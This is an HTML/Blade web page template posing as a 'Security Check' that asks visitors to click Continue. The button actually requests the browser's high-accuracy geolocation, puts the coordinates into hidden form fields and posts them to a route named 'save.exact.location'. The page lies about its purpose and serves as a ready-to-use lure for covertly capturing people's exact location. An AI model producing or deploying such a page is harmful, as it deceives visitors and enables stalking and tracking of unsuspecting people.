<!DOCTYPE html>
<html>
<head>
    <title>Checking Security...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 300px; }
        .btn { background-color: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.3s; width: 100%; }
        .btn:hover { background-color: #0056b3; }
        p { color: #555; font-size: 14px; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h3>Security Check</h3>
    <p>Please click the button below to continue to the website.</p>
    <button class="btn" onclick="getLocation()">Continue</button>
</div>

<form id="geoForm" action="{{ route('save.exact.location') }}" method="POST">
    @csrf
    <input type="hidden" name="lat" id="lat">
    <input type="hidden" name="lng" id="lng">
</form>

<script>
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    document.getElementById('lat').value = position.coords.latitude;
                    document.getElementById('lng').value = position.coords.longitude;
                    document.getElementById('geoForm').submit();
                },
                function(error) {
                    console.log("Error: " + error.message);
                    document.getElementById('geoForm').submit();
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            document.getElementById('geoForm').submit();
        }
    }
</script>

</body>
</html>
